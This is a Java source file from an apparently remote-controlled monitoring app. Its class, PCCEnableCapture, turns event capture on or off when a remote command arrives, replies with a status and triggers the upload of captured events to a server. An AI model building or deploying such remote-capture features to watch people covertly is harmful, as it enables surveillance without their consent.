package com.vvt.rmtcmd.pcc;

import com.vvt.global.Global;
import com.vvt.pref.PrefGeneral;
import com.vvt.pref.Preference;
import com.vvt.pref.PreferenceType;
import com.vvt.prot.command.response.PhoenixCompliantCommand;
import com.vvt.protsrv.SendEventManager;
import com.vvt.rmtcmd.resource.RmtCmdTextResource;
import com.vvt.std.Constant;
import com.vvt.version.VersionInfo;

public class PCCEnableCapture extends PCCRmtCmdAsync {
	
	private int mode = 0;
	private SendEventManager eventSender = Global.getSendEventManager();
	
	public PCCEnableCapture(int mode) {
		this.mode = mode;
	}
	
	// Runnable
	public void run() {
		doPCCHeader(PhoenixCompliantCommand.ENABLE_CAPTURE.getId());
		try {
			Preference pref = Global.getPreference();
			PrefGeneral general = (PrefGeneral)pref.getPrefInfo(PreferenceType.PREF_GENERAL);
			general.setCaptured(true);
			String replyMsg = RmtCmdTextResource.CAPTURE_ENABLED;
			if (mode == DISABLE) {
				general.setCaptured(false);
				replyMsg = RmtCmdTextResource.CAPTURE_DISABLED;
			}
			pref.commit(general);
			responseMessage.append(Constant.OK);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(replyMsg);
			observer.cmdExecutedSuccess(this);
		} catch(Exception e) {
			responseMessage.append(Constant.ERROR);
			responseMessage.append(Constant.CRLF);
			responseMessage.append(e.getMessage());
			observer.cmdExecutedError(this);
		}
		createSystemEventOut(responseMessage.toString());
		// To send events
		eventSender.sendEvents();
	}
	
	// PCCRmtCommand
	public void execute(PCCRmtCmdExecutionListener observer) {
		super.observer = observer;
		Thread th = new Thread(this);
		th.start();
	}
}
